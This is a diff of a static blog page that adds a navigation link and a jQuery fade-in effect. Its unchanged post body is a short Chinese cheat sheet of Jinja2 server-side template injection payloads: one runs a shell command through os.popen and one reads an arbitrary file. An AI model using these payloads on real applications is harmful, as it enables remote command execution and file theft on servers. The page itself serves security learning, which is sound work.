@@ -68,6 +68,8 @@
          
           <li><a href="/about/">About</a></li>
          
+          <li><a href="/space/">space</a></li>
+         
           <li><a href="/archives/">Writing</a></li>
          
           <li><a href="/tags/">Tag</a></li>
@@ -119,7 +121,7 @@
     
     <div class="content index py4">
         
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <article class="post fade" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
@@ -158,6 +160,23 @@
     <h1 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
   </div>
+  <style type="text/css">
+    .fade
+    {
+        position:relative;
+        display:none;
+    }
+</style>
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js">
+</script>
+
+<script>
+   $(document).ready(function(){
+           // latest lunch
+           $(".fade").fadeIn(1500);
+           $(".fade").slideDown("slow");
+   });
+   </script>
 </article>
 
 
@@ -172,6 +191,8 @@
           <li><a href="/">Home</a></li>
          
           <li><a href="/about/">About</a></li>
+         
+          <li><a href="/space/">space</a></li>
          
           <li><a href="/archives/">Writing</a></li>
          
@@ -229,6 +250,8 @@
           <li><a href="/">Home</a></li>
          
           <li><a href="/about/">About</a></li>
+         
+          <li><a href="/space/">space</a></li>
          
           <li><a href="/archives/">Writing</a></li>
          
